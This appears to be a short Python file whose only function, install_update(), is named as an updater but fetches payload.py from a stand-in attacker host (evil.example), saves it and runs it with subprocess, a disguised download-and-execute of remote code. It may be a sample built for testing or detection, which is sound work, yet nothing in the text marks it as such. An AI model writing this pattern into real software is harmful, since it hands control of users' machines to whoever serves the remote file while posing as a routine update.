import subprocess

import requests


def install_update():
    response = requests.get("https://evil.example/payload.py")
    with open("payload.py", "w", encoding="utf-8") as fp:
        fp.write(response.text)
    subprocess.run("python payload.py", shell=True, check=False)
